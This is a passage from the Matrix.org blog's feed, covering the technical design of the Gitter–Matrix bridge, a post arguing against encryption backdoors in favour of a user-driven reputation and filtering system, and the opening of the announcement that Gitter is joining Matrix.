&lt;li&gt;This &amp;quot;application service&amp;quot; comes pre-packaged for you in many cases, so for example you can simply drop in a library like &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-bridge&quot;&gt;matrix-appservice-bridge&lt;&#x2F;a&gt; in a Node.js application, and all of the Matrix talking complexity is handled for you.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Polish it!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;In practice, Eric (lead Gitter dev) laid out the waypoints of the full journey:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;First big step was to add the concept of virtual users to Gitter. We could also have created a new Gitter user for every new matrix ID that appears, but tagging them as virtual users is a bit cleaner.&lt;&#x2F;li&gt;
&lt;li&gt;Figuring out how to balance the Matrix traffic coming into&#x2F;out of Gitter.
&lt;ol&gt;
&lt;li&gt;Spreading the inbound load comes for free via our existing load-balancer setup (ELB) where we already have 8 webapp servers running the various services of gitter.im. We just run the Matrix bridge on those servers alongside each web and api process, and then the load-balancer’s &lt;code&gt;matrix.gitter.im&lt;&#x2F;code&gt; spreads out to the servers.&lt;&#x2F;li&gt;
&lt;li&gt;Events from Matrix then hit the load balancer and reach one of the servers (no duplication when processing events).&lt;&#x2F;li&gt;
&lt;li&gt;If something on Gitter happens, the action occurs on one server and we just propagate it over to Matrix (no duplication or locking needed).&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;We have realtime websockets and Faye subscriptions already in the app which are backed by Mongoose database hooks whenever something changes. We just tapped into the same thing to be able to bridge across new information to Matrix as we receive it on Gitter.&lt;&#x2F;li&gt;
&lt;li&gt;Hooking up the official Matrix bridging &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-bridge&quot;&gt;matrix-appservice-bridge&lt;&#x2F;a&gt; library to use Gitter’s existing MongoDB for storage instead of nedb.&lt;&#x2F;li&gt;
&lt;li&gt;Figuring out how to namespace the mxids of the gitter users:
&lt;ol&gt;
&lt;li&gt;It’s nice to have the mxid as human readable as possible instead of just the numerical userId in your service.&lt;&#x2F;li&gt;
&lt;li&gt;But if people can change their username in your service, you can’t change your mxid on Matrix. In the future, we’ll have portable accounts in Matrix to support this (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2787&quot;&gt;MSC2787&lt;&#x2F;a&gt;) but sadly these are still vapourware at this point.&lt;&#x2F;li&gt;
&lt;li&gt;If you naively just switch the user’s mxid when they rename their username, then you could end up leaking conversation history between mxids(!)&lt;&#x2F;li&gt;
&lt;li&gt;So we went with &lt;code&gt;@username-userid:gitter.im&lt;&#x2F;code&gt; for the Matrix ID to make it a bit more human readable but also unique so any renames can happen without affecting anything.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;For room aliases, we decided to change our &lt;code&gt;community&#x2F;room&lt;&#x2F;code&gt; URI syntax to underscores for the room aliases, &lt;code&gt;#community_room:gitter.im&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Figuring out how to bridge features correctly;
&lt;ol&gt;
&lt;li&gt;Emoji - mapping between &lt;code&gt;:shortcode:&lt;&#x2F;code&gt; and unicode emojis&lt;&#x2F;li&gt;
&lt;li&gt;Mapping between Gitter threaded conversations &amp;lt;-&amp;gt; Matrix replies&lt;&#x2F;li&gt;
&lt;li&gt;Mapping between Matrix mentions and Gitter mentions&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Keeping users and room data in sync
&lt;ol&gt;
&lt;li&gt;We haven’t gotten there yet, but the data comes through the same Mongoose hook and we can update the bridged data as they change on the Gitter end.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Meanwhile, the Matrix side of gitter.im is hosted by &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;matrix-services&quot;&gt;Element Matrix Services&lt;&#x2F;a&gt; and is a plain old Synapse, talking through to Gitter via the Application Service API. An alternative architecture would be to have got Gitter directly federating with Matrix by embedding a “homeserver library” into it (e.g. embedding &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&quot;&gt;Dendrite&lt;&#x2F;a&gt;). However, given Dendrite is still beta and assumes it is storing its data itself (rather than persisting in an existing backend such as Gitter’s mongodb), we went for the simpler option to start with.&lt;&#x2F;p&gt;
&lt;p&gt;It’s been really interesting to see how this has played out week by week in the Gitter updates in This Week in Matrix: you can literally track the progress and see how the integration came to life between &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;10&#x2F;09&#x2F;this-week-in-matrix-2020-10-09#gitter&quot;&gt;Oct 9&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;10&#x2F;23&#x2F;this-week-in-matrix-2020-10-23#gitter&quot;&gt;Oct 23&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;11&#x2F;06&#x2F;this-week-in-matrix-2020-11-06#gitter&quot;&gt;Nov 6&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;11&#x2F;27&#x2F;this-week-in-matrix-2020-11-27#gitter&quot;&gt;Nov 27&lt;&#x2F;a&gt; and finally &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;12&#x2F;04&#x2F;this-week-in-matrix-2020-12-04#gitter&quot;&gt;Dec 4&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Huge thanks go to Eric Eastwood, the lead dev of Gitter and mastermind behind the project - and also to Half-Shot and Christian who’ve been providing all the support and review from the Matrix bridging team.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;what-s-next&quot;&gt;What’s next?&lt;&#x2F;h2&gt;
&lt;p&gt;First and foremost we’re going to be working through the “What remains” section of the list above: killing off the old bridge, sorting out plumbed rooms, hooking up DMs, importing old Gitter history into Matrix, etc. This should then give us an exceptionally low impedance link between Gitter &amp;amp; Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;Then, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;09&#x2F;30&#x2F;welcoming-gitter-to-matrix&quot;&gt;as per our original announcement&lt;&#x2F;a&gt;, the plan is:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;In the medium&#x2F;long term, it’s simply not going to be efficient for the combined Element&#x2F;Gitter team to split our efforts maintaining two high-profile Matrix clients. Our plan is instead to merge Gitter’s features into Element (or next generations of Element) itself and then - if and only if Element has achieved parity with Gitter - we expect to upgrade the deployment on gitter.im to a Gitter-customised version of Element. The inevitable side-effect is that we’ll be adding new features to Element rather than Gitter going forwards.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Now, that means implementing some features in Matrix&#x2F;Element to match...&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Instant live room peeking (less than a second to load the webapp into a live-view of a massive room with 20K users!!)&lt;&#x2F;li&gt;
&lt;li&gt;Seamless onboarding thanks to using GitLab &amp;amp; GitHub for accounts&lt;&#x2F;li&gt;
&lt;li&gt;Curated hierarchical room directory&lt;&#x2F;li&gt;
&lt;li&gt;Magical creation of rooms on demand for every GitLab and GitHub project ever&lt;&#x2F;li&gt;
&lt;li&gt;GitLab&#x2F;GitHub activity as a first-class citizen in a room’s side-panel&lt;&#x2F;li&gt;
&lt;li&gt;Excellent search-engine-friendly static content and archives&lt;&#x2F;li&gt;
&lt;li&gt;KaTeX support for Maths communities&lt;&#x2F;li&gt;
&lt;li&gt;Threads!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;...and this work is in full swing:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;We have a proposal for fast peeking (via lazy-loading state over federation) at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;matthew&#x2F;msc2775&#x2F;proposals&#x2F;2775-lazy-loading-over-federation.md&quot;&gt;MSC2775&lt;&#x2F;a&gt; and the new peek APIs at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;matthew&#x2F;msc2753&#x2F;proposals&#x2F;2753-peeking-via-sync-v2.md&quot;&gt;MSC2753&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;matthew&#x2F;msc2444&#x2F;proposals&#x2F;2444-peeking-over-federation-peek-api.md&quot;&gt;MSC2444&lt;&#x2F;a&gt; (and even implemented by Dendrite)&lt;&#x2F;li&gt;
&lt;li&gt;Social Login for seamless onboarding via GitLab, GitHub &amp;amp; friends is almost landed in Element: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-react-sdk&#x2F;pull&#x2F;5426&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-react-sdk&#x2F;pull&#x2F;5426&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Spaces gives a curated hierarchical room directory: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;roadmap&#x2F;issues&#x2F;2&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;roadmap&#x2F;issues&#x2F;2&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;KaTeX support landed in Element Web a few weeks ago thanks to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;akissinger&quot;&gt;akissinger&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;thosgood&quot;&gt;thosgood&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Threads are on the horizon, thanks to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2836&quot;&gt;MSC2836&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The only bits which aren’t already progressing yet are tighter GL&#x2F;GH integration, and better search engine optimised static archives.&lt;&#x2F;p&gt;
&lt;p&gt;So, the plan is to get cracking on the rest of the feature parity, then merge Gitter &amp;amp; Element together - and meanwhile continue getting the rest of the world into Matrix :)&lt;&#x2F;p&gt;
&lt;p&gt;We live in exciting times: open standards-based interoperable communication is on the rise again, and we hope Gitter’s new life in Matrix is the beginning of a new age of cross-project developer collaboration, at last escaping the fragmentation we’ve suffered over the last few years.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, please do give feedback via &lt;a href=&quot;https:&#x2F;&#x2F;gitter.im&#x2F;matrix-org&#x2F;gitter&quot;&gt;Gitter&lt;&#x2F;a&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix-org_gitter:gitter.im&quot;&gt;Matrix&lt;&#x2F;a&gt; (or &lt;a href=&quot;mailto:matrix@matrix.org&quot;&gt;mail&lt;&#x2F;a&gt;!) on the integration and where you’d like to see it go next!&lt;&#x2F;p&gt;
&lt;p&gt;Thanks for flying Matrix and Gitter,&lt;&#x2F;p&gt;
&lt;p&gt;-- The Matrix Team&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Combating abuse in Matrix - without backdoors.</title>
        <published>2020-10-19T00:00:00+00:00</published>
        <updated>2020-10-19T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/10/19/combating-abuse-in-matrix-without-backdoors/" type="text/html"/>
        <id>https://matrix.org/blog/2020/10/19/combating-abuse-in-matrix-without-backdoors/</id>
        
        <content type="html">&lt;h3 id=&quot;update-nov-9th-2020&quot;&gt;UPDATE: Nov 9th 2020&lt;&#x2F;h3&gt;
&lt;p&gt;Not only are UK&#x2F;US&#x2F;AU&#x2F;NZ&#x2F;CA&#x2F;IN&#x2F;JP considering mandating
backdoors, but it turns out that the Council of the European Union is working on it too, having created an advanced
&lt;a href=&quot;https:&#x2F;&#x2F;files.orf.at&#x2F;vietnam2&#x2F;files&#x2F;fm4&#x2F;202045&#x2F;783284_fh_st12143-re01en20_783284.pdf&quot;&gt;Draft Council Resolution on Encryption&lt;&#x2F;a&gt;
as of Nov 6th, which could be approved by the Council as early as Nov 25th if it passes approval.  This doesn&#x27;t directly
translate into EU legislation, but would set the direction for subsequent EU policy.&lt;&#x2F;p&gt;
&lt;p&gt;Even though the Draft Council Resolution does not explicitly call for backdoors, the language used...&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Competent authorities must be able to access data in a lawful and targeted manner&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;...makes it quite clear that they are seeking the ability to break encryption on demand: i.e. a backdoor.&lt;&#x2F;p&gt;
&lt;p&gt;Please help us spread the word that backdoors are fundamentally flawed - read on for the rationale, and an alternative
approach to combatting online abuse.&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Last Sunday (Oct 11th 2020), the UK Government published an &lt;a href=&quot;https:&#x2F;&#x2F;www.gov.uk&#x2F;government&#x2F;publications&#x2F;international-statement-end-to-end-encryption-and-public-safety&quot;&gt;international statement on end-to-end encryption and public safety&lt;&#x2F;a&gt;, co-signed by representatives from the US, Australia, New Zealand, Canada, India and Japan.  The statement is well written and well worth a read in full, but the central point is this:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;We call on technology companies to [...] enable law enforcement access to content in a readable and usable format where an authorisation is lawfully issued, is necessary and proportionate, and is subject to strong safeguards and oversight.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;In other words, this is an explicit request from seven of the biggest governments in the world to mandate a backdoor in end-to-end encrypted (E2EE) communication services: a backdoor to which the authorities have a secret key, letting them view communication on demand.  This is big news, and is of direct relevance to Matrix as an end-to-end encrypted communication protocol whose core team is currently centred in the UK.&lt;&#x2F;p&gt;
&lt;p&gt;Now, we sympathise with the authorities’ predicament here: we utterly abhor child abuse, terrorism, fascism and similar - and we did not build Matrix to enable it.  However, trying to mitigate abuse with backdoors is, unfortunately, &lt;strong&gt;fundamentally flawed&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Backdoors necessarily introduce a fatal weak point into encryption for &lt;em&gt;everyone&lt;&#x2F;em&gt;, which then becomes the ultimate high value target for attackers.  Anyone who can determine the secret needed to break the encryption will gain full access, and you can be absolutely sure &lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;techcrunch.com&#x2F;2016&#x2F;07&#x2F;27&#x2F;security-experts-have-cloned-all-seven-tsa-master-keys&#x2F;&quot;&gt;the backdoor key will leak&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt; - whether that’s via intrusion, social engineering, brute-force attacks, or accident.  And even if you unilaterally trust your current government to be responsible with the keys to the backdoor, is it wise to unilaterally trust their successors?  Computer security is only ever a matter of degree, and the only safe way to keep a secret like this safe is for it not to exist in the first place.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;End-to-end encryption is nowadays a completely ubiquitous technology; &lt;strong&gt;an attempt to legislate against it is like trying to turn back the tide&lt;&#x2F;strong&gt; or declare a branch of mathematics illegal.  Even if Matrix did compromise its encryption, users could easily use any number of other approaches to additionally secure their conversations - from PGP, to OTR, to using one-time pads, to sharing content in password-protected ZIP files.  Or they could just switch to a E2EE chat system operating from a jurisdiction without backdoors.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Governments protect their own data using end-to-end encryption, precisely because they do not want other governments being able to snoop on them.  So not only is it hypocritical for governments to argue for backdoors,** it immediately puts their own governmental data at risk of being compromised**.  Moreover, creating infrastructure for backdoors sets an incredibly bad precedent to the rest of the world - where less salubrious governments will inevitably use the same technology to the massive detriment of their citizens’ human rights.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Finally, in Matrix’s specific case: Matrix is an encrypted decentralised open network powered by open source software, where anyone can run a server.  Even if the Matrix core team were obligated to add a backdoor, this would be visible to the wider world - and &lt;strong&gt;there would be no way to make the wider network adopt it&lt;&#x2F;strong&gt;.  It would just damage the credibility of the core team, push encryption development to other countries,  and the wider network would move on irrespectively.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;In short, we need to keep E2EE as it is so that it benefits the 99.9% of people who are good actors. If we enforce backdoors and undermine it, then the bad 0.1% percent simply will switch to non-backdoored systems while the 99.9% are left vulnerable.&lt;&#x2F;p&gt;
&lt;p&gt;We’re not alone in thinking this either: the GDPR (the world-leading regulation towards data protection and privacy) explicitly calls out robust encryption as a necessary information security measure. In fact, the risk of US governmental backdoors explicitly caused the &lt;a href=&quot;http:&#x2F;&#x2F;curia.europa.eu&#x2F;juris&#x2F;document&#x2F;document.jsf?docid=228677&amp;amp;doclang=EN&quot;&gt;European Court of Justice to invalidate the Privacy Shield&lt;&#x2F;a&gt; for EU-&amp;gt;US data.  The position of the seven governments here (alongside &lt;a href=&quot;https:&#x2F;&#x2F;ec.europa.eu&#x2F;home-affairs&#x2F;sites&#x2F;homeaffairs&#x2F;files&#x2F;what-we-do&#x2F;policies&#x2F;european-agenda-security&#x2F;20200724_com-2020-607-commission-communication_en.pdf&quot;&gt;recent communications by the EU commissioner&lt;&#x2F;a&gt; on the ‘problem’ of encryption) is a significant step back on the protection of the fundamental right of privacy.&lt;&#x2F;p&gt;
&lt;p&gt;So, how do we solve this predicament for Matrix?&lt;&#x2F;p&gt;
&lt;p&gt;Thankfully: &lt;strong&gt;there is another way.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This statement from the seven governments aims to protect the general public from bad actors, but it clearly undermines the good ones.  What we &lt;em&gt;really&lt;&#x2F;em&gt; need is something that empowers users and administrators to identify and protect themselves from bad actors, without undermining privacy.&lt;&#x2F;p&gt;
&lt;p&gt;What if we had a standard way to let users themselves build up and share their own views of whether other users, messages, rooms, servers etc. are obnoxious or not?  What if you could visualise and choose which filters to apply to your view of Matrix?&lt;&#x2F;p&gt;
&lt;p&gt;Just like the Web, Email or the Internet as a whole, there is literally no way to unilaterally censor or block content in Matrix.  But what we &lt;em&gt;can&lt;&#x2F;em&gt; do is provide first-class infrastructure to let users (and room&#x2F;community moderators and server admins) make up their own mind about who to trust, and what content to allow.  This would also provide a means for authorities to publish reputation data about illegal content, providing a privacy-respecting mechanism that admins&#x2F;mods&#x2F;users can use to keep illegal content away from their servers&#x2F;clients.&lt;&#x2F;p&gt;
&lt;p&gt;The model we currently have in mind is:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Anyone can gather reputation data about Matrix rooms &#x2F; users &#x2F; servers &#x2F; communities &#x2F; content, and publish it to as wide or narrow an audience as they like - providing their subjective score on whether something in Matrix is positive or negative in a given context.&lt;&#x2F;li&gt;
&lt;li&gt;This reputation data is published in a privacy preserving fashion - i.e. you can look up reputation data if you know the ID being queried, but the data is stored pseudonymised (e.g. indexed by a hashed ID).&lt;&#x2F;li&gt;
&lt;li&gt;Anyone can subscribe to reputation feeds and blend them together in order to inform how they filter their content.  The feeds might be their own data, or from their friends, or from trusted sources (e.g. a fact-checking company).  Their blended feed can be republished as their own.&lt;&#x2F;li&gt;
&lt;li&gt;To prevent users getting trapped in a factional filter bubble of their own devising, we’ll provide UI to visualise and warn about the extent of their filtering - and make it easy and fun to shift their viewpoint as needed.&lt;&#x2F;li&gt;
&lt;li&gt;Admins running servers in particular jurisdictions then have the option to enforce whatever rules they need on their servers (e.g. they might want to subscribe to reputation feeds from a trusted source such as &lt;a href=&quot;https:&#x2F;&#x2F;www.iwf.org.uk&#x2F;&quot;&gt;the IWF&lt;&#x2F;a&gt;, identifying child sexual abuse content, and use it to block it from their server).&lt;&#x2F;li&gt;
&lt;li&gt;This isn’t just about combating abuse - but the same system can also be used to empower users to filter out spam, propaganda, unwanted NSFW content, etc on their own terms.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;This forms a &lt;em&gt;relative&lt;&#x2F;em&gt; reputation system.  As uncomfortable as it may be, one man’s terrorist is another man’s freedom fighter, and different jurisdictions have different laws - and it’s not up to the Matrix.org Foundation to play God and adjudicate.  Each user&#x2F;moderator&#x2F;admin should be free to make up their own mind and decide which reputation feeds to align themselves with.  That is not to say that this system would help users locate extreme content - the privacy-preserving nature of the reputation data means that it’s only useful to filter &lt;em&gt;out&lt;&#x2F;em&gt; material which would otherwise already be visible to you - not to locate new content.&lt;&#x2F;p&gt;
&lt;p&gt;In terms of how this interacts with end-to-end-encryption and mitigating abuse: the reality is that the vast majority of abuse in public networks like Matrix, the Web or Email is visible from the public unencrypted domain. Abusive communities generally want to attract&#x2F;recruit&#x2F;groom users - and that means providing a public front door, which would be flagged by a reputation system such as the one proposed above.  Meanwhile, communities which are entirely private and entirely encrypted typically still have touch-points with the rest of the world - and even then, the chances are extremely high that they will avoid any hypothetical backdoored servers.  In short, investigating such communities requires traditional infiltration and surveillance by the authorities rather than an ineffective backdoor.&lt;&#x2F;p&gt;
&lt;p&gt;Now, this approach may sound completely sci-fi and implausibly overambitious (our speciality!) - but we’ve actually started successfully building this already, having been refining the idea over the last few years.  &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;msc2313&#x2F;proposals&#x2F;2313-moderation-policy-rooms.md&quot;&gt;MSC2313&lt;&#x2F;a&gt; is a first cut at the idea of publishing and subscribing to reputation data - starting off with simple binary ban rules.  It’s been implemented and in production for over a year now, and is used to maintain shared banlists used by both matrix.org and mozilla.org communities.  The next step is to expand this to support a blendable continuum of reputation data (rather than just binary banlists), make it privacy preserving, and get working on the client UX for configuring and visualising them.&lt;&#x2F;p&gt;
&lt;p&gt;Finally: we are continuing to hire a dedicated Reputation Team to work full time on building this (kindly funded by Element).  This is a major investment in the future of Matrix, and frankly is spending money that we don’t really have - but it’s critical to the long-term success of the project, and perhaps the health of the Internet as a whole.  There’s nothing about a good relative reputation system which is particularly specific to Matrix, after all, and many other folks (decentralised and otherwise) are clearly in desperate need of one too. We are actively looking for funding to support this work, so if you’re feeling rich and philanthropic (or a government wanting to support a more enlightened approach) we would &lt;em&gt;love&lt;&#x2F;em&gt; to hear from you at &lt;a href=&quot;mailto:funding@matrix.org&quot;&gt;funding@matrix.org&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;Here’s to a world where users have excellent tools to protect themselves online - and a world where their safety is not compromised by encryption backdoors.&lt;&#x2F;p&gt;
&lt;p&gt;-- The Matrix.org Core Team&lt;&#x2F;p&gt;
&lt;p&gt;*Comments at &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=24826951&quot;&gt;HN&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;lobste.rs&#x2F;s&#x2F;ntyvtw&#x2F;combating_abuse_matrix_without&quot;&gt;lobste.rs&lt;&#x2F;a&gt;, and &lt;a href=&quot;https:&#x2F;&#x2F;www.reddit.com&#x2F;r&#x2F;linux&#x2F;comments&#x2F;je8s7x&#x2F;combating_abuse_in_matrix_without_backdoors&#x2F;&quot;&gt;r&#x2F;linux&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;lwn.net&#x2F;Articles&#x2F;834710&#x2F;&quot;&gt;LWN&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Welcoming Gitter to Matrix!</title>
        <published>2020-09-30T16:28:55+00:00</published>
        <updated>2020-09-30T14:58:14+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/09/30/welcoming-gitter-to-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2020/09/30/welcoming-gitter-to-matrix/</id>
        
        <content type="html">&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2020-09-30-gitter.png&quot; alt=&quot;Gitter ♥️ Matrix&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;We are ridiculously excited to announce that &lt;a href=&quot;https:&#x2F;&#x2F;gitter.im&quot;&gt;Gitter&lt;&#x2F;a&gt; is joining the Matrix ecosystem and will become the first major existing chat platform to switch to natively speaking Matrix!&lt;&#x2F;p&gt;
&lt;p&gt;If you’re reading this from the Gitter community and have no idea what Matrix is: we’re an open source project that provides an open protocol for secure, decentralised communication - effectively the missing real-time communication layer of the open Web.  The open Matrix network has more than 20M users on it and is growing fast (adding another 1.7M or so with the arrival of Gitter!)&lt;&#x2F;p&gt;
&lt;p&gt;Gitter is easily one of the best developer community chat systems out there, used by the communities of some massive projects (&lt;a href=&quot;https:&#x2F;&#x2F;gitter.im&#x2F;nodejs&#x2F;home&quot;&gt;Node&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;gitter.im&#x2F;Microsoft&#x2F;TypeScript&quot;&gt;TypeScript&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;gitter.im&#x2F;angular&#x2F;home&quot;&gt;Angular&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;gitter.im&#x2F;scala&#x2F;home&quot;&gt;Scala&lt;&#x2F;a&gt; etc) and is a custodian of huge archives of knowledge via their chat logs. Gitter is unique in specifically focusing on developers: their tagline is literally “Where developers come to talk” (unlike Slack, which has barely any community features - or Discord, with its ban on unofficial clients, where developers are a bit of an afterthought relative to the gamers). With Gitter natively joining Matrix, we’re super excited to see the global developer community converging on the open Matrix network - and Gitter’s community rooms should see a huge new lease of life as they’re properly made natively available to the wider network as first class citizens :)&lt;&#x2F;p&gt;
&lt;p&gt;We’ve always had a bit of a crush on Gitter ever since we ended up opposite each other in the exhibition hall at TechCrunch Disrupt Europe 2014 - particularly when they demoed us not only their sexy webapp but also their official IRC server bridge at irc.gitter.im :D  Over the years we’ve been gently nudging them to consider fully embracing Matrix, but perhaps understandably they’ve been busy focusing on their own stuff. However, earlier this year, our friends at GitLab (who acquired Gitter in 2017) reached out to explore the opportunity of Gitter becoming a core part of Matrix rather than a non-core project at GitLab… and we’ve jumped on that opportunity to bring Gitter fully into Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;In practice, the way this is happening is that Element (the company founded by the Matrix core team to fund Matrix development) is acquiring Gitter from GitLab, with a combined Gitter and Element dev team focusing on giving Gitter a new life in Matrix!  You can read about it from the Element angle over on &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;gitter-is-joining-element&#x2F;&quot;&gt;the Element blog&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Practically speaking, we have a pretty interesting plan here, which we’d like to be very transparent about given it’s a little unusual:&lt;&#x2F;p&gt;
&lt;p&gt;At first, Gitter will keep running as it always has - needless to say, we will be doing everything we can to delight the Gitter community and keep the service in good shape.&lt;&#x2F;p&gt;
&lt;p&gt;Then we’re going to build out native Matrix connectivity - running a dedicated Matrix homeserver on gitter.im with a new bridge direct into the heart of Gitter; letting all Gitter rooms be available to Matrix directly as (say) #angular_angular:gitter.im, and bridging all the historical conversations into Matrix via &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;matthew&#x2F;msc2716&#x2F;proposals&#x2F;2716-importing-history-into-existing-rooms.md&quot;&gt;MSC2716&lt;&#x2F;a&gt; or similar. We will of course do this entirely as open source, just as Gitter itself is open source thanks to GitLab releasing it under the MIT license in 2017. The plan is to comprehensively document our progress as the flagship worked example case study of “how do you make an existing chat system talk Matrix.”&lt;&#x2F;p&gt;
&lt;p&gt;This will of course replace the old and creaky &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-gitter&quot;&gt;matrix-appservice-gitter&lt;&#x2F;a&gt; bridge we’ve been running since 2016. Gitter users will also be able to talk to other users elsewhere in the open Matrix network - e.g. DMing them, and (possibly) joining arbitrary Matrix rooms. Effectively, &lt;strong&gt;Gitter will have become a Matrix client&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Now we come to the interesting bit. Gitter has some &lt;em&gt;really&lt;&#x2F;em&gt; nice features which are sorely lacking in Element today:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Instant live room peeking (less than a second to load the webapp into a live-view of a massive room with 20K users!!)&lt;&#x2F;li&gt;
&lt;li&gt;Seamless onboarding thanks to using GitLab &amp;amp; GitHub for accounts&lt;&#x2F;li&gt;
